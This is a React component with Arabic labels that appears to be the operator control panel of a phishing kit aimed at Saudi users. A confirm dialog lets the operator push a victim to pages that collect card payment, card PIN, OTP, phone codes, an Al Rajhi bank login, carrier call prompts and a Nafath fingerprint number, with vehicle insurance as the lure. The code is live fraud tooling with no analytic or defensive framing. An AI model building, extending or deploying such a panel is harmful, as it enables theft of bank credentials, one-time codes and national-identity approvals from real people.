// src/components/ConfirmDialog.js
import React from "react";
import { Modal, Button, FormControl } from "react-bootstrap";

const LABEL = {
  "index.html":        "الرئيسية",
  "vehicle.html":      "المركبة",
  "insurance.html":    "التأمين",
  "addons.html":       "الإضافات",
  "summary.html":      "الملخص",
  "paymen.html":       "الدفع",
  "pin.html":          "رمز البطاقة (PIN)",
  "verify.html":       "رمز التحقق (OTP)",
  "phone.html":        "الجوال",
  "phonecode.html":    "رمز الجوال",
  "rajhi.html":        "دخول الراجحي",
  "stcCall.html":      "اتصال STC",
  "mobilyCall.html":   "اتصال Mobily",
  "nafad-basmah.html": "نفاذ - بصمة",
};

export default function ConfirmDialog({ show, page, basmah, onBasmahChange, onConfirm, onDecline, onClose }) {
  if (!show) return null;

  // صفحة nafad-basmah تحتاج input للرقم
  const needsInput = page === "nafad-basmah.html";

  return (
    <Modal show={show} onHide={onClose} centered backdrop="static" keyboard={true}>
      <Modal.Header dir="rtl">
        <Modal.Title>
          هل تريد توجيه المستخدم إلى <strong>{LABEL[page] || page}</strong>؟
        </Modal.Title>
        <Button variant="link" onClick={onClose} style={{ fontSize:"1.5rem" }}>&times;</Button>
      </Modal.Header>

      <Modal.Body className="text-center" dir="rtl">
        {needsInput && (
          <>
            <p style={{ marginBottom:"0.5rem", fontWeight:500 }}>
              أدخل رقم نفاذ (رقمين):
            </p>
            <FormControl
              placeholder="مثال: 42"
              maxLength={2}
              value={basmah}
              onChange={(e) => onBasmahChange(e.target.value.replace(/\D/g, ""))}
              className="mb-3 text-center"
              style={{ fontSize:"1.5rem", fontWeight:"bold", letterSpacing:"0.5rem" }}
            />
          </>
        )}

        <Button
          variant="success"
          onClick={onConfirm}
          className="mx-2"
          disabled={needsInput && !basmah}
        >
          نعم
        </Button>
        <Button variant="danger" onClick={onDecline} className="mx-2">
          لا
        </Button>
      </Modal.Body>
    </Modal>
  );
}
